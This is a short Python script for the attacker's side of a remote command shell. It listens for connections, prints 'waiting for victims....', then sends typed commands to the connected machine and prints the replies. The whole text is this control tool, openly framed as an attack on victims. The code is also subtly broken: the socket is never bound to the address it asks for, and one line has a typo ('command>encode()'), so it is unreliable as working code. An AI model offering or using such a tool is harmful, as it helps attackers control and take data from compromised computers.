import socket
ip = input("Enter a ip  address:")
port = int(input("Enter a port number:"))
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.listen()
print("waiting for victims....")
client_socket, client_address = server.accept()
print(f"connected to {client_address}")
while True:
    command = input("Eneter a command:")
    if command.lower() == "exit":
        client_socket.send(command.encode())
        break
    client_socket.send(command>encode())
    data = client_socket.recv(4024).decode()
    print(f"data{data}")

